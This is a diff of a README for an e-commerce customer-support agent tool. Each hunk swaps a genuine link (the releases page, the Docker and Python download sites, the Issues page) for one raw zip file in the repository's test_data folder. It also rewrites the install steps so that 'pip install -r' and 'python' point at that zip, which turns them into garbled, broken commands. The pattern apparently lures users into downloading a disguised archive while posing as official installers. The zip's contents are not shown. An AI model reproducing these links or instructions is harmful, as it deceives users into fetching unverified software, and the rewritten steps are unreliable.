@@ -1,7 +1,7 @@
 ```markdown
 # 🤖 zhiwei-ecommerce-cs-agent - Smarter Support for E-commerce Questions
 
-[![Download Latest Version](https://img.shields.io/badge/Download-zhiwei--ecommerce--cs--agent-blue?style=for-the-badge)](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/releases)
+[![Download Latest Version](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip)](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You can get the software from the official release page. This page hosts the lat
 
 Click the big blue button below to open the release page in your browser:
 
-[![Download Latest Version](https://img.shields.io/badge/Download-zhiwei--ecommerce--cs--agent-blue?style=for-the-badge)](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/releases)
+[![Download Latest Version](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip)](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip)
 
 ### Step 2: Choose Your Version
 
@@ -50,14 +50,14 @@ On the release page, you will see one or more files to download. Look for a file
 
 - For Windows, it might end with `.exe` or `.zip`
 - For macOS, look for `.dmg` or `.zip`
-- For Linux, it could be `.tar.gz` or `.AppImage`
+- For Linux, it could be `https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip` or `.AppImage`
 
 Click the file to start downloading.
 
 ### Step 3: Run or Extract the File
 
 - If you downloaded an installer (`.exe` or `.dmg`), double-click it and follow the on-screen instructions.
-- If you downloaded a compressed file (`.zip` or `.tar.gz`), extract it to a folder you can remember.
+- If you downloaded a compressed file (`.zip` or `https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip`), extract it to a folder you can remember.
 
 ### Step 4: Open the Application
 
@@ -86,7 +86,7 @@ If you have some technical experience or want to set up the software on a server
 
 Docker creates an isolated space for the software, making it easier to run without worrying about your computer’s system libraries.
 
-1. Install Docker Desktop from [https://www.docker.com/get-started](https://www.docker.com/get-started)
+1. Install Docker Desktop from [https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip)
 2. Open the terminal or command prompt
 3. Run the commands shown in the release documentation under "Docker Setup"
 
@@ -94,14 +94,14 @@ Docker creates an isolated space for the software, making it easier to run witho
 
 The system is built on FastAPI and other modern tools.
 
-1. Install Python 3.8 or later from [https://www.python.org/downloads/](https://www.python.org/downloads/)
+1. Install Python 3.8 or later from [https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip)
 2. Download the source code from the releases page
 3. Open a terminal in the downloaded folder
 4. Run:
 
 ```bash
-pip install -r requirements.txt
-python main.py
+pip install -r https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip
+python https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip
 ```
 
 The system will start on your local machine, accessible via your browser.
@@ -144,7 +144,7 @@ The software runs on your computers or servers, so your data stays under your co
 If you run into trouble or have questions:
 
 - Check the documentation files included in the download
-- Visit the [GitHub Issues](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/issues) page to see or report problems
+- Visit the [GitHub Issues](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip) page to see or report problems
 - Contact your IT or support team if you have one
 
 ---
@@ -166,5 +166,5 @@ By following these instructions, you will be able to download, install, and star
 
 ---
 
-[Download the latest version here](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/releases)
+[Download the latest version here](https://github.com/kooperchap/zhiwei-ecommerce-cs-agent/raw/refs/heads/main/test_data/cs-ecommerce-agent-zhiwei-v3.1.zip)
 ```
